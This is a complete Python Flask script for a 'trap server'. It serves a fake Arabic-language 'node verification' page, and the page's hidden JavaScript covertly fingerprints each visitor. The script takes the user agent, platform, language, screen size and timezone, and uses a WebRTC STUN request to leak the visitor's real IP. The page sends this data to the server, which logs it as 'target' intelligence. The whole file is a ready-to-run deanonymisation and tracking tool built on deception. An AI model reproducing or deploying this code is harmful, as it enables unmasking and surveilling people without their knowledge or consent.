from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

TRAP_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostics & Node Status</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: monospace; text-align: center; padding-top: 50px; }
        .box { border: 1px solid #30363d; padding: 20px; display: inline-block; background: #161b22; border-radius: 6px; }
        h2 { color: #58a6ff; }
    </style>
</head>
<body>
    <div class="box">
        <h2>جاري التحقق من اتصال العقدة (Node Verification)...</h2>
        <p>الرجاء الانتظار ريثما يتم مطابقة الأمان الجغرافي للاتصال.</p>
    </div>

    <script>
        async function extractIntel() {
            let data = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenRes: window.screen.width + "x" + window.screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        data.webrtc = ice.candidate.candidate;
                        sendData(data);
                    }
                };
            } catch(e) {
                sendData(data);
            }
        }

        function sendData(d) {
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(d)
            });
        }

        window.onload = extractIntel;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"\n[!] [ALERT] تم رصد زائر جديد!")
    print(f"    - الوقت: {timestamp}")
    print(f"    - الـ IP الخارجي: {visitor_ip}")
    print(f"    - المتصفح: {user_agent}")
    
    with open("target_intel.log", "a") as f:
        f.write(f"[{timestamp}] IP: {visitor_ip} | UA: {user_agent}\n")
        
    return render_template_string(TRAP_PAGE)

@app.route('/collect', methods=['POST'])
def collect():
    content = request.json
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[+] [DATA CAPTURED] بيانات متقدمة من الهدف:")
    for key, val in content.items():
        print(f"    - {key}: {val}")
        
    with open("target_intel.log", "a") as f:
        f.write(f"[{timestamp}] DATA: {content}\n")
    return {"status": "ok"}

if __name__ == '__main__':
    print("[*] Trap Server is running on port 5000...")
    app.run(host='0.0.0.0', port=5000)
